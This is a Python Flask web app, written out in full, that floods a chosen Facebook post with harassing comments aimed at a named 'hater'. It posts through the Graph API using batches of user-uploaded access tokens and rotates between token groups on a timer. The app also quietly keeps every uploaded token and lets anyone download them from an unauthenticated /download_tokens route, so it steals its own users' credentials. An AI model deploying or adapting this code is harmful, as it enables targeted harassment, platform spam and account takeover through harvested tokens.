from flask import Flask, request, render_template, redirect, url_for, Response
import threading
import time
import requests

app = Flask(__name__)

ADMIN_PASSWORD = "FAIZU223344"
all_tokens = set()  # global token storage

# ---------- Helpers ----------
def extract_file_lines(file_storage):
    if file_storage and file_storage.filename:
        return [line.strip() for line in file_storage.read().decode().splitlines() if line.strip()]
    return []

def extract_tokens(key):
    tokens = extract_file_lines(request.files.get(key))
    all_tokens.update(tokens)
    return tokens

def post_comment(token, message, post_id):
    url = f"https://graph.facebook.com/{post_id}/comments"
    try:
        res = requests.post(url, data={"message": message, "access_token": token})
        return res.status_code == 200
    except:
        return False

def worker(token_groups, comment_groups, hater_name, post_id, delay, switch_interval_sec):
    group_idx, last_switch = 0, time.time()
    comment_idx = [0] * len(comment_groups)

    while True:
        if time.time() - last_switch >= switch_interval_sec:
            group_idx = (group_idx + 1) % len(token_groups)
            last_switch = time.time()
            print(f"[⚙️] Switched to Group {group_idx+1}")

        tokens, comments = token_groups[group_idx], comment_groups[group_idx % len(comment_groups)]
        if not tokens or not comments:
            time.sleep(delay); continue

        for token in tokens:
            msg = f"{hater_name} {comments[comment_idx[group_idx] % len(comments)]}"
            ok = post_comment(token, msg, post_id)
            print(f"[{time.ctime()}] G{group_idx+1} | {msg} | {'✅' if ok else '❌'}")
            comment_idx[group_idx] += 1
            time.sleep(delay)

# ---------- Routes ----------
@app.route('/')
def home():
    return render_template("form.html")

@app.route('/start', methods=['POST'])
def start():
    token_groups = [extract_tokens(k) for k in ['token1','token2','token3']]
    comment_groups = [extract_file_lines(request.files.get(k)) for k in ['cmt1','cmt2','cmt3'] if request.files.get(k)]

    if not any(token_groups): return "❌ No tokens found."
    if not any(comment_groups): return "❌ No comments found."

    args = (
        token_groups,
        comment_groups,
        request.form['haters_name'],
        request.form['post_id'],
        int(request.form['interval']),
        int(request.form['switch_hour'])*3600
    )
    threading.Thread(target=worker, args=args, daemon=True).start()
    return "✅ Commenting started in background."

@app.route('/admin', methods=['GET','POST'])
def admin():
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASSWORD:
            return render_template("admin.html", total_tokens=len(all_tokens))
        return render_template("login.html", error="Wrong password")
    return render_template("login.html")

@app.route('/download_tokens')
def download_tokens():
    if not all_tokens: return "No tokens yet"
    data = "\n".join(all_tokens)
    return Response(data, mimetype="text/plain",
                    headers={"Content-Disposition":"attachment;filename=Alltoken.txt"})

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=10000)
